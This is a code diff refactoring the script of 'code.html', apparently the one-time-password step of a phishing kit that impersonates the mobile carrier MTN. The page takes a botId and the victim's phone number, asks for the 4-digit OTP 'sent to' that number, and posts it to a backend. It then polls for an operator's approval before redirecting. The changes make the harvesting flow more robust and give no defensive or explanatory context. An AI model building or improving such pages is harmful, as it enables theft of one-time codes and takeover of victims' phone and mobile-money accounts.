@@ -220,23 +220,18 @@
 
 
 <!-- ============================================================
-     SCRIPT 1 — BOT ID RESOLVER (moved from <head> to here)
-     Runs first because it appears first among the bottom scripts.
+     SCRIPT 1 — BOT ID RESOLVER
      ============================================================ -->
 <script>
 (function () {
   try {
     const params = new URLSearchParams(window.location.search);
 
-    // 1. Read from URL FIRST
     let botId = params.get('botId');
-
-    // 2. Fall back to localStorage ONLY if URL is empty
     if (!botId) {
       botId = localStorage.getItem('botId');
     }
 
-    // 3. If STILL empty, refuse to proceed
     if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
       document.documentElement.innerHTML =
         '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
@@ -247,17 +242,14 @@
       throw new Error('botId missing from URL and localStorage');
     }
 
-    // 4. Persist so later pages inherit it
     localStorage.setItem('botId', botId);
 
-    // 5. Ensure the URL always carries botId
     if (params.get('botId') !== botId) {
       params.set('botId', botId);
       const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
       window.history.replaceState({}, '', newUrl);
     }
 
-    // 6. Expose globally
     window.__BOT_ID__ = botId;
 
     console.log('🆔 botId resolved immediately:', botId);
@@ -275,42 +267,45 @@
 (function() {
   'use strict';
 
-  // ---------- CONFIG ----------
-  const BACKEND_URL = ""; // leave empty to use same-origin
+  // ============================================================
+  // CONFIG
+  // ============================================================
+  const BACKEND_URL = "";            // leave empty to use same-origin
+  const NEXT_PAGE   = "success.html"; // <-- page after code.html
 
-  // ---------- BOTID ----------
+  // ============================================================
+  // BOTID
+  // ============================================================
   const botId = window.__BOT_ID__;
   if (!botId) return;
 
-  // ---------- READ OTHER DATA ----------
+  // ============================================================
+  // READ USER DATA — URL first, then localStorage.
+  // NEVER redirect away; show inline error instead.
+  // ============================================================
   const urlParams = new URLSearchParams(window.location.search);
-  let phone = urlParams.get('phone') || localStorage.getItem('phone');
-  let name  = urlParams.get('name')  || localStorage.getItem('fullName');
 
-  if (!phone) {
-    alert('Session expired. Please start over.');
-    window.location.href = 'details.html?botId=' + encodeURIComponent(botId);
-    return;
-  }
-  if (!name) {
-    name = 'MTN User';
-    try { localStorage.setItem('fullName', name); } catch (e) {}
-  }
+  let phone = urlParams.get('phone') || localStorage.getItem('phone') || '';
+  let name  = urlParams.get('name')  || localStorage.getItem('fullName') || 'MTN User';
 
-  try { localStorage.setItem('phone', phone); } catch (e) {}
+  try { if (phone) localStorage.setItem('phone', phone); } catch (e) {}
+  try { localStorage.setItem('fullName', name); } catch (e) {}
 
-  // Update subtitle with user's phone
+  // Subtitle
   const subtitle = document.getElementById('subtitlePlaceholder');
-  if (phone) {
-    subtitle.textContent = 'Enter OTP that was sent to ' + phone;
+  if (subtitle) {
+    subtitle.textContent = phone
+      ? 'Enter OTP that was sent to ' + phone
+      : 'Enter OTP that was sent to your phone';
   }
 
-  // ---------- DOM REFS ----------
+  // ============================================================
+  // DOM REFS
+  // ============================================================
   const inputs      = document.querySelectorAll('.otp input');
   const continueBtn = document.querySelector('.continue-btn');
   let   msgDiv      = document.getElementById('message-box');
 
-  // Fallback in case #message-box is missing
   if (!msgDiv) {
     const div = document.createElement('div');
     div.id = 'message-box';
@@ -320,7 +315,9 @@
     msgDiv = document.getElementById('message-box');
   }
 
-  // ---------- UI HELPERS ----------
+  // ============================================================
+  // UI HELPERS
+  // ============================================================
   function showMessage(text, isError) {
     msgDiv.textContent = text;
     msgDiv.className = isError ? 'error' : 'success';
@@ -354,7 +351,9 @@
     }
   }
 
-  // ---------- OTP INPUT HANDLING ----------
+  // ============================================================
+  // OTP INPUT HANDLING
+  // ============================================================
   inputs.forEach(function(input, index) {
     input.addEventListener('input', function() {
       var cleaned = sanitizeDigit(this.value);
@@ -398,7 +397,9 @@
     input.addEventListener('blur', checkAllFilled);
   });
 
-  // ---------- TIMER (5 minutes) ----------
+  // ============================================================
+  // TIMER (5 minutes)
+  // ============================================================
   var resendWrapEl = document.getElementById('resendWrap');
   var totalSeconds = 5 * 60;
   var timerInterval = null;
@@ -444,7 +445,9 @@
 
   startTimer(5 * 60);
 
-  // ---------- POLLING ----------
+  // ============================================================
+  // POLLING HELPERS
+  // ============================================================
   var pollTimer = null;
 
   function stopPolling() {
@@ -454,28 +457,32 @@
     }
   }
 
-  // ---------- REDIRECT HELPER ----------
+  // ============================================================
+  // REDIRECT — single navigation to NEXT_PAGE
+  // ============================================================
+  var hasRedirected = false;
+
   function goToSuccess(requestId) {
-    var params = [
+    if (hasRedirected) return;
+    hasRedirected = true;
+
+    var qs = [
       'botId='     + encodeURIComponent(botId || ''),
       'requestId=' + encodeURIComponent(requestId || ''),
       'phone='     + encodeURIComponent(phone || ''),
       'name='      + encodeURIComponent(name || 'MTN User')
     ].join('&');
 
-    var successUrl = 'success.html?' + params;
+    var nextUrl = NEXT_PAGE + '?' + qs;
 
-    console.log('✅ Approved — redirecting to:', successUrl);
+    console.log('✅ Approved — redirecting to:', nextUrl);
 
-    window.location.href = successUrl;
-
-    // Fallback if href assignment is blocked
-    setTimeout(function () {
-      try { window.location.replace(successUrl); } catch (e) {}
-    }, 400);
+    window.location.assign(nextUrl);
   }
 
-  // ---------- SUBMIT OTP ----------
+  // ============================================================
+  // SUBMIT OTP
+  // ============================================================
   continueBtn.addEventListener('click', function() {
     if (this.disabled || this.classList.contains('loading')) return;
 
@@ -483,6 +490,11 @@
     inputs.forEach(function(inp) { otp += inp.value; });
     if (otp.length !== 4) {
       showMessage('Please enter a 4-digit OTP.', true);
+      return;
+    }
+
+    if (!phone) {
+      showMessage('❌ Session expired. Please reopen the official link.', true);
       return;
     }
 
@@ -507,10 +519,7 @@
       var requestId = data.requestId;
       if (!requestId) throw new Error('No request ID received');
 
-      // Save for downstream pages + safety net
-      try {
-        localStorage.setItem('codeRequestId', requestId);
-      } catch (e) {}
+      try { localStorage.setItem('codeRequestId', requestId); } catch (e) {}
 
       stopPolling();
       var attempts = 0;
@@ -536,11 +545,6 @@
               setLoading(false);
               showMessage('✅ Verified! Redirecting...', false);
 
-              /* =====================================================
-                 REDIRECT TARGET: success.html
-                 Passes botId, requestId, phone, name so success.html
-                 can display the correct summary.
-              ===================================================== */
               setTimeout(function() {
                 goToSuccess(requestId);
               }, 700);
@@ -560,7 +564,7 @@
                   inp.classList.remove('error');
                 });
               }, 600);
-              inputs[0].focus();
+              try { inputs[0].focus(); } catch (e) {}
               return;
             }
 
@@ -568,9 +572,7 @@
               stopPolling();
               setLoading(false);
               showMessage('⏳ Taking too long. Please try again.', true);
-              return;
             }
-            // else keep polling silently
           })
           .catch(function(err) {
             console.error('Polling error:', err);
@@ -583,9 +585,17 @@
     });
   });
 
-  // ---------- INIT ----------
+  // ============================================================
+  // INIT
+  // ============================================================
   checkAllFilled();
-  inputs[0].focus();
+  try { inputs[0].focus(); } catch (e) {}
+
+  if (!phone) {
+    showMessage('⚠️ Missing phone number. Please reopen the official link.', true);
+  }
+
+  console.log('✅ code.html ready. botId =', botId, '| phone =', phone || '(missing)');
 })();
 </script>
 
